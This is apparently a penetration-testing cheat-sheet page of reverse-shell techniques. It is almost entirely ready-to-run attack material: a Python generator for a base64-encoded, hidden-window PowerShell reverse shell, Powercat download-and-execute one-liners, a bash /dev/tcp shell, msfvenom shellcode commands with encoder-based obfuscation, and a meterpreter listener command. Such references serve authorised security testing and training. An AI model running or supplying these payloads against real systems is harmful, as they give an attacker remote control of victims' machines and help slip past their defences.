---
description: Various reverse shell techniques in fast go cheat-sheet format
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reverse Shells

### PowerShell Base64

Generate base64 encoded payload for reverse shell for windows target.

{% code title="windows-rev-b64.py" overflow="wrap" %}
```python
import sys
import base64

def generate_payload(ip, port):
    payload = (
        f"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream=$client.GetStream();"
        "[byte[]]$bytes=0..65535|%{0};"
        "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){"
        "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback=(iex $data 2>&1 | Out-String);"
        "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
        "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
        "$client.Close()"
    )
    return payload

def generate_cmd(ip, port):
    payload = generate_payload(ip, port)
    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    return cmd

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <ip> <port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    cmd = generate_cmd(ip, port)
    print(cmd)

```
{% endcode %}

Usage:

```bash
python windows-rev-b64.py <local_ip> <local_port>
```

### Powercat

Serve Powercat.ps1

```bash
cd /usr/share/windows-resources && python3 -m http.server 80
```

Start a `netcat` listener

```
rlwrap nc -lvnp 4444
```

Run one of the commands:

{% tabs %}
{% tab title="Batch" %}
```batch
powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('http://<local_host>/powercat.ps1'); powercat -c <local_host> -p <local_port> -e powershell"
```
{% endtab %}

{% tab title="Powershell" %}
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://<local_host>/powercat.ps1");powercat -c <local_host> -p <local_port> -e powershell 
```
{% endtab %}
{% endtabs %}

### Bash pipe

Base64 Encoded Bash - useful for web shells.

```bash
echo 'bash -i>& /dev/tcp/<ip>/4444 0>&1' | base64
```

### Msfvenom&#x20;

Generating shell code

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f powershell -v sc
```
{% endcode %}

Generating obfuscated shell code with bad words:

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
{% endcode %}

Start meterpreter listener one-liner

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT <LPORT>;run;"
```

## References

{% embed url="https://www.revshells.com/" %}
revshell generator
{% endembed %}
